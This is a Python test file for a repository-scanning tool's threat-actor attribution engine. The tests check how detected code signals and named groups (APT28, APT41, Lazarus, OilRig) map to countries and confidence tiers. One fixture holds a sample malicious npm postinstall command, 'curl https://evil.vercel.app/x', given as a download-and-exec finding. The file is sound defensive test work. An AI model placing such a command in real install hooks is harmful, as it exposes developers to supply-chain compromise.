"""Tests for the multi-actor / country-level attribution engine."""

from __future__ import annotations

from git_warden.actors import attribute, is_named_group, origin_for_actor


def _flag(rule="eval-decoded", category="obfuscation", snippet="", file="x.js", line=1):
    return {"file": file, "line": line, "category": category, "rule": rule, "snippet": snippet}


def test_origin_mapping_covers_five_blocs():
    assert origin_for_actor("APT28") == "Russia"
    assert origin_for_actor("apt41") == "China"
    assert origin_for_actor("OilRig") == "Iran"
    assert origin_for_actor("Lazarus Group") == "North Korea"
    assert origin_for_actor("FIN7") == "Cybercrime"
    assert origin_for_actor("nobody") is None
    # legacy "(per OSM)" suffix still resolves.
    assert origin_for_actor("DPRK (North Korea) (per OSM)") == "North Korea"


def test_named_group_vs_bare_nation():
    assert is_named_group("APT28") and is_named_group("Kimsuky")
    assert not is_named_group("russia")           # bare nation tag, not a group
    assert not is_named_group("dprk (north korea)")


def test_dprk_evidence_attributes_north_korea():
    flags = [_flag(rule="eval-decoded"),
             _flag(rule="npm-postinstall", category="download_exec",
                   snippet="curl https://evil.vercel.app/x")]
    a = attribute(flags, None, {"evil.vercel.app"})
    assert a.origin == "North Korea" and a.tier == "probable" and a.attributed
    assert "dprk" in a.tags and "contagious-interview" in a.tags


def test_named_russian_group_attributes_russia_without_our_evidence():
    # This is how OTHER countries surface: OSM/news names a specific group, and we
    # attribute the country even with zero DPRK-style evidence signals.
    a = attribute([_flag(rule="benign", category="x")], "APT28", set())
    assert a.origin == "Russia" and a.attributed and a.tier == "probable"
    assert "russia" in a.tags
    assert "named_group_intel" in a.signals


def test_named_chinese_and_iranian_groups():
    assert attribute([], "APT41", set()).origin == "China"
    assert attribute([], "Charming Kitten", set()).origin == "Iran"
    assert attribute([], "APT41", set()).attributed


def test_bare_nation_tag_is_a_lead_not_an_assertion():
    a = attribute([_flag(rule="benign", category="x")], "russia", set())
    assert a.origin == "Russia" and a.tier == "possible" and not a.attributed


def test_no_signal_no_intel_is_unattributed():
    a = attribute([_flag(rule="benign", category="x")], None, set())
    assert a.origin is None and a.tier == "unattributed"


def test_lone_dprk_vector_stays_possible():
    a = attribute([_flag(rule="eval-decoded")], None, set())
    assert a.origin == "North Korea" and a.tier == "possible" and not a.attributed
    assert "dprk-consistent-tradecraft" in a.tags
